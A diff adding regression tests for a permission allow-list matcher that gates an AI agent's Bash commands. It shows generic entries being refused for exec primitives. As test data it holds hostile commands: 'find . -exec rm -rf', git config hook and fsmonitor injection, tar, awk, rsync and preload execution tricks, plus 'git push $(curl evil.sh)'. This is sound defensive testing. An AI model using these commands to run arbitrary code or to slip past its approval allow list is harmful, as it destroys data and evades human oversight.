@@ -44,6 +44,69 @@ describe('matchAllowPattern - #536 regressions', () => {
     ).toBeNull();
   });
 
+  test('a generic allow entry cannot be turned into arbitrary execution', () => {
+    // The same bug one level down: `-exec` does not make `find` write, it makes
+    // `find` run something the user never saw. Every one of these was approved
+    // before the exec-primitive veto.
+    expect(matchAllowPattern('Bash', { command: 'find . -exec rm -rf {} +' }, ['find'])).toBeNull();
+    expect(
+      matchAllowPattern('Bash', { command: 'find . -name "*.log" -delete' }, ['find']),
+    ).toBeNull();
+    expect(
+      matchAllowPattern('Bash', { command: 'find / -fprintf /tmp/pwned %p' }, ['find']),
+    ).toBeNull();
+    expect(
+      matchAllowPattern('Bash', { command: "git -c core.fsmonitor='touch /tmp/pwned' status" }, [
+        'git',
+      ]),
+    ).toBeNull();
+    expect(
+      matchAllowPattern('Bash', { command: 'git -c core.hooksPath=/tmp/evil status' }, ['git']),
+    ).toBeNull();
+    expect(
+      matchAllowPattern('Bash', { command: "tar cf /dev/null --to-command='touch /tmp/x' y" }, [
+        'tar',
+      ]),
+    ).toBeNull();
+    expect(
+      matchAllowPattern('Bash', { command: 'awk \'BEGIN{system("touch /tmp/pwned")}\'' }, ['awk']),
+    ).toBeNull();
+    expect(
+      matchAllowPattern('Bash', { command: 'rsync -e \'sh -c "touch /tmp/x"\' a b' }, ['rsync']),
+    ).toBeNull();
+    expect(
+      matchAllowPattern('Bash', { command: 'bun test --preload ./evil.ts' }, ['bun test']),
+    ).toBeNull();
+  });
+
+  test('the exec veto does not swallow ordinary uses of the same commands', () => {
+    // A veto that refuses the normal case would push everything to the LLM and
+    // quietly make the allow list useless.
+    expect(matchAllowPattern('Bash', { command: 'find . -name "*.ts"' }, ['find'])).toBe('find');
+    expect(matchAllowPattern('Bash', { command: 'git status' }, ['git'])).toBe('git');
+    expect(matchAllowPattern('Bash', { command: 'grep -e pattern file' }, ['grep'])).toBe('grep');
+    expect(matchAllowPattern('Bash', { command: 'sed -e s/a/b/ file' }, ['sed'])).toBe('sed');
+    expect(matchAllowPattern('Bash', { command: 'bun test --coverage' }, ['bun test'])).toBe(
+      'bun test',
+    );
+  });
+
+  test('an entry that spells out the primitive itself is honored', () => {
+    // A prefix match requires the command to START with the entry, so an entry
+    // carrying `-exec` only matches a command the user spelled out that far.
+    // They saw it and approved it; refusing here would be refusing their rule.
+    expect(matchAllowPattern('Bash', { command: 'find . -delete' }, ['find . -delete'])).toBe(
+      'find . -delete',
+    );
+    expect(
+      matchAllowPattern('Bash', { command: 'find . -exec echo {} ;' }, ['find . -exec echo']),
+    ).toBe('find . -exec echo');
+    // ...and it still does not cover a DIFFERENT exec of the same command.
+    expect(
+      matchAllowPattern('Bash', { command: 'find . -exec rm -rf {} +' }, ['find . -exec echo']),
+    ).toBeNull();
+  });
+
   test('shell control vetoes an otherwise matching command', () => {
     expect(
       matchAllowPattern('Bash', { command: 'git push $(curl evil.sh)' }, ['git push']),
